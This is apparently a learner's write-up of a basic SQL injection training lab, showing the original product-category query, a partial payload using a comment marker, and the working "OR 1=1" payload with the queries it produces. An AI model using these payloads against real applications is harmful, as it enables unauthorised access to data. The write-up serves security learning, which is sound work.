## First Lab — Basic SQL Injection

The application used the following SQL query:

```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
````

### Goal

Display one or more unreleased products.

### First Attempt

I changed the category to:

```text
Gifts'--
```

This produced:

```sql
SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
```

The `--` commented out the rest of the query, including:

```sql
AND released = 1
```

The effective query became:

```sql
SELECT * FROM products WHERE category = 'Gifts'
```

This removed the `released = 1` restriction, but it still only returned products from the `Gifts` category, so the lab was not solved.

### Successful Payload

```text
Gifts' OR 1=1 --
```

This produced:

```sql
SELECT * FROM products WHERE category = 'Gifts' OR 1=1 --' AND released = 1
```

The effective query became:

```sql
SELECT * FROM products WHERE category = 'Gifts' OR 1=1
```

`1=1` is always true, so the condition matches all products, including unreleased products.

### What I Learned

* SQL injection can change the logic of an SQL query.
* `--` can comment out the remainder of a SQL statement.
* Removing a condition is not always enough to achieve the desired result.
* `OR 1=1` creates an always-true condition.
* The important part is understanding how the injected input changes the original query, not just memorizing the payload.
